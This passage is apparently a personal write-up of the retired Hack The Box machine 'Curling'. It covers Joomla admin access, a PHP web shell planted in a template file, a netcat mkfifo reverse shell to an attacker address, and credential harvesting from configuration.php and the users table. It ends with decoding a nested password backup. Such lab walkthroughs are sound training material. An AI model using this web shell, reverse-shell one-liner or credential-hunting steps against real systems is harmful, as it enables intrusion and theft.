After logging in to the main landing page http://10.10.10.150/ , floris can use the same credentials and log onto the Joomla interface using the same credentials here: http://10.10.10.150/administrator/

- Joomla! 3.8.8

Tried running some Joomla exploits to no avail.

## system information
```
=============
System Information
=============
php: Linux curling 4.15.0-156-generic #163-Ubuntu SMP Thu Aug 19 23:31:58 UTC 2021 x86_64
dbserver: mysql
dbversion: 5.7.35-0ubuntu0.18.04.1
dbcollation: utf8_general_ci
dbconnectioncollation: utf8mb4_general_ci
phpversion: 7.2.24-0ubuntu0.18.04.8
server: Apache/2.4.29 (Ubuntu)
sapi_name: apache2handler
version: Joomla! 3.8.8 Stable [ Amani ] 22-May-2018 14:00 GMT
platform: Joomla Platform 13.1.0 Stable [ Curiosity ] 24-Apr-2013 00:00 GMT
useragent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0

<SNIP>
```


## Poking around
There are some templates available:
- http://10.10.10.150/administrator/index.php?option=com_templates&view=templates

### Editing the index.php file 
```
<?php
/**
 * @package     Joomla.Site
 * @subpackage  Templates.protostar
 *
 * @copyright   Copyright (C) 2005 - 2018 Open Source Matters, Inc. All rights reserved.
 * @license     GNU General Public License version 2 or later; see LICENSE.txt
 */

//** creating a web shell */
$command = ($_GET['cmd']);
$output = shell_exec($command);
echo "<pre>$output</pre>";
  
```

Output:
```
┌──(kali㉿kali)-[~]
└─$ curl -s http://10.10.10.150/index.php?cmd=whoami | head -n 1
<pre>www-data

uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

## Getting a reverse shell
https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

Burp: URL encode the payload
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 1337 >/tmp/f

becomes

%72%6d%20%2f%74%6d%70%2f%66%3b%6d%6b%66%69%66%6f%20%2f%74%6d%70%2f%66%3b%63%61%74%20%2f%74%6d%70%2f%66%7c%2f%62%69%6e%2f%73%68%20%2d%69%20%32%3e%26%31%7c%6e%63%20%31%30%2e%31%30%2e%31%34%2e%32%20%31%33%33%37%20%3e%2f%74%6d%70%2f%66
```

URL: http://10.10.10.150/index.php?cmd=rm%20%2ftmp%2ff%3bmkfifo%20%2ftmp%2ff%3bcat%20%2ftmp%2ff|%2fbin%2fsh%20-i%202%3E%261|nc%2010.10.14.2%201337%20%3E%2ftmp%2ff

```
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.10.150] 52524
/bin/sh: 0: can't access tty; job control turned off
$ which python3
/usr/bin/python3
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@curling:/var/www/html$ ^Z
zsh: suspended  nc -lvnp 1337
                                                                             
┌──(kali㉿kali)-[~]
└─$ stty size;stty raw -echo;fg
39 77
[1]  + continued  nc -lvnp 1337
                               export TERM=xterm-256color
www-data@curling:/var/www/html$ whoami
www-data


```

## Looking for passwords
```
www-data@curling:/var/www/html$ grep -ri pass configuration.php 
        public $password = 'mYsQ!P4ssw0rd$yea!';
        public $ftp_pass = '';
        public $smtppass = '';
        public $proxy_pass = '';

<SNIP>
        public $user = 'floris';
        public $password = 'mYsQ!P4ssw0rd$yea!';
        public $db = 'Joombla';
        public $dbprefix = 'eslfu_';
        public $live_site = '';
        public $secret = 'VGQ09exHr8W2leID';
<SNIP>

```

## mysql enumeration
```
www-data@curling:/var/www/html$ mysql -u floris -P 3306 -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 139
Server version: 5.7.35-0ubuntu0.18.04.1 (Ubuntu)

Copyright (c) 2000, 2021, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> 


```

## joombla database
```
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| Joombla            |
+--------------------+
2 rows in set (0.00 sec)

mysql> use Joombla;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> 

mysql> show tables;
+-------------------------------+
| Tables_in_Joombla             |
+-------------------------------+
| eslfu_assets                  |
| eslfu_associations            |
| eslfu_banner_clients          |
| eslfu_banner_tracks           |
| eslfu_banners                 |
| eslfu_categories              |
| eslfu_contact_details         |
| eslfu_content                 |
| eslfu_content_frontpage       |
| eslfu_content_rating          |
| eslfu_content_types           |
| eslfu_contentitem_tag_map     |
| eslfu_core_log_searches       |
| eslfu_extensions              |
| eslfu_fields                  |
| eslfu_fields_categories       |
| eslfu_fields_groups           |
| eslfu_fields_values           |
| eslfu_finder_filters          |
| eslfu_finder_links            |
| eslfu_finder_links_terms0     |
| eslfu_finder_links_terms1     |
| eslfu_finder_links_terms2     |
| eslfu_finder_links_terms3     |
| eslfu_finder_links_terms4     |
| eslfu_finder_links_terms5     |
| eslfu_finder_links_terms6     |
| eslfu_finder_links_terms7     |
| eslfu_finder_links_terms8     |
| eslfu_finder_links_terms9     |
| eslfu_finder_links_termsa     |
| eslfu_finder_links_termsb     |
| eslfu_finder_links_termsc     |
| eslfu_finder_links_termsd     |
| eslfu_finder_links_termse     |
| eslfu_finder_links_termsf     |
| eslfu_finder_taxonomy         |
| eslfu_finder_taxonomy_map     |
| eslfu_finder_terms            |
| eslfu_finder_terms_common     |
| eslfu_finder_tokens           |
| eslfu_finder_tokens_aggregate |
| eslfu_finder_types            |
| eslfu_languages               |
| eslfu_menu                    |
| eslfu_menu_types              |
| eslfu_messages                |
| eslfu_messages_cfg            |
| eslfu_modules                 |
| eslfu_modules_menu            |
| eslfu_newsfeeds               |
| eslfu_overrider               |
| eslfu_postinstall_messages    |
| eslfu_redirect_links          |
| eslfu_schemas                 |
| eslfu_session                 |
| eslfu_tags                    |
| eslfu_template_styles         |
| eslfu_ucm_base                |
| eslfu_ucm_content             |
| eslfu_ucm_history             |
| eslfu_update_sites            |
| eslfu_update_sites_extensions |
| eslfu_updates                 |
| eslfu_user_keys               |
| eslfu_user_notes              |
| eslfu_user_profiles           |
| eslfu_user_usergroup_map      |
| eslfu_usergroups              |
| eslfu_users                   |
| eslfu_utf8_conversion         |
| eslfu_viewlevels              |
+-------------------------------+
72 rows in set (0.00 sec)

```

### Looking through table names
```
mysql> select * from eslfu_users;
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+----------------------------------------------------------------------------------------------+---------------------+------------+--------+------+--------------+
| id  | name       | username | email               | password                                                     | block | sendEmail | registerDate        | lastvisitDate       | activation | params                                                                                       | lastResetTime       | resetCount | otpKey | otep | requireReset |
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+----------------------------------------------------------------------------------------------+---------------------+------------+--------+------+--------------+
| 836 | Super User | floris   | webmaster@localhost | $2y$10$4t3DQSg0DSlKcDEkf1qEcu6nUFEr/gytHfVENwSmZN1MXxE1Ssx.e |     0 |         1 | 2018-05-22 18:49:17 | 2025-09-05 14:18:40 | 0          | {"admin_style":"","admin_language":"","language":"","editor":"","helpsite":"","timezone":""} | 0000-00-00 00:00:00 |          0 |        |      |            0 |
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+----------------------------------------------------------------------------------------------+---------------------+------------+--------+------+--------------+
1 row in set (0.00 sec)

```

$2y$10$4t3DQSg0DSlKcDEkf1qEcu6nUFEr/gytHfVENwSmZN1MXxE1Ssx.e is likely a bcrypt hash.
```
┌──(kali㉿kali)-[~/Desktop/HackTheBox/Retired Machines/Curling]
└─$ hashid hash.txt                                                         
--File 'hash.txt'--
Analyzing '$2y$10$4t3DQSg0DSlKcDEkf1qEcu6nUFEr/gytHfVENwSmZN1MXxE1Ssx.e'
[+] Blowfish(OpenBSD) 
[+] Woltlab Burning Board 4.x 
[+] bcrypt 
--End of file 'hash.txt'-- 
```

## Cracking attempts
Ongoing...

## Backup file discovered
While waiting for the hash to be cracked, a password_backup file was discovered.
```
www-data@curling:/home/floris$ cat password_backup 
00000000: 425a 6839 3141 5926 5359 819b bb48 0000  BZh91AY&SY...H..
00000010: 17ff fffc 41cf 05f9 5029 6176 61cc 3a34  ....A...P)ava.:4
00000020: 4edc cccc 6e11 5400 23ab 4025 f802 1960  N...n.T.#.@%...`
00000030: 2018 0ca0 0092 1c7a 8340 0000 0000 0000   ......z.@......
00000040: 0680 6988 3468 6469 89a6 d439 ea68 c800  ..i.4hdi...9.h..
00000050: 000f 51a0 0064 681a 069e a190 0000 0034  ..Q..dh........4
00000060: 6900 0781 3501 6e18 c2d7 8c98 874a 13a0  i...5.n......J..
00000070: 0868 ae19 c02a b0c1 7d79 2ec2 3c7e 9d78  .h...*..}y..<~.x
00000080: f53e 0809 f073 5654 c27a 4886 dfa2 e931  .>...sVT.zH....1
00000090: c856 921b 1221 3385 6046 a2dd c173 0d22  .V...!3.`F...s."
000000a0: b996 6ed4 0cdb 8737 6a3a 58ea 6411 5290  ..n....7j:X.d.R.
000000b0: ad6b b12f 0813 8120 8205 a5f5 2970 c503  .k./... ....)p..
000000c0: 37db ab3b e000 ef85 f439 a414 8850 1843  7..;.....9...P.C
000000d0: 8259 be50 0986 1e48 42d5 13ea 1c2a 098c  .Y.P...HB....*..
000000e0: 8a47 ab1d 20a7 5540 72ff 1772 4538 5090  .G.. .U@r..rE8P.
000000f0: 819b bb48                                ...H

```

It looks like a hexdump.
Reversing a hexdump: https://stackoverflow.com/questions/43724144/hexdump-reverse-command

## Unzipping adventures
```
┌──(kali㉿kali)-[~/Desktop/HackTheBox/Retired Machines/Curling]
└─$ cat password_backup | xxd -r > reversed_backup
                                                                             
┌──(kali㉿kali)-[~/Desktop/HackTheBox/Retired Machines/Curling]
└─$ file reversed_backup 
reversed_backup: bzip2 compressed data, block size = 900k
                                                                             
┌──(kali㉿kali)-[~/Desktop/HackTheBox/Retired Machines/Curling]
└─$ bzip2 -d reversed_backup 
bzip2: Can't guess original name for reversed_backup -- using reversed_backup.out
                                                                             
┌──(kali㉿kali)-[~/Desktop/HackTheBox/Retired Machines/Curling]
└─$ file reversed_backup.out 
reversed_backup.out: gzip compressed data, was "password", last modified: Tue May 22 19:16:20 2018, from Unix, original size modulo 2^32 141
                                                                             
┌──(kali㉿kali)-[~/Desktop/HackTheBox/Retired Machines/Curling]
└─$ gunzip reversed_backup.out                                    
gzip: reversed_backup.out: unknown suffix -- ignored

┌──(kali㉿kali)-[~/…/HackTheBox/Retired Machines/Curling/unzipping]
└─$ mv reversed_backup.out reversed_backup.gz      
                                                                             
┌──(kali㉿kali)-[~/…/HackTheBox/Retired Machines/Curling/unzipping]
└─$ gunzip reversed_backup.gz 
                                                                             
┌──(kali㉿kali)-[~/…/HackTheBox/Retired Machines/Curling/unzipping]
└─$ file reversed_backup    
reversed_backup: bzip2 compressed data, block size = 900k
                                                                             
┌──(kali㉿kali)-[~/…/HackTheBox/Retired Machines/Curling/unzipping]
└─$ bzip2 -d reversed_backup
bzip2: Can't guess original name for reversed_backup -- using reversed_backup.out
                                                                             
┌──(kali㉿kali)-[~/…/HackTheBox/Retired Machines/Curling/unzipping]
└─$ file reversed_backup.out 
reversed_backup.out: POSIX tar archive (GNU)
                                                                             
┌──(kali㉿kali)-[~/…/HackTheBox/Retired Machines/Curling/unzipping]
└─$ tar -xvf reversed_backup.out 
password.txt
                                                                             
┌──(kali㉿kali)-[~/…/HackTheBox/Retired Machines/Curling/unzipping]
└─$ cat password.txt                              
5<SNIP>l

```

These credentials work to SSH as `floris`
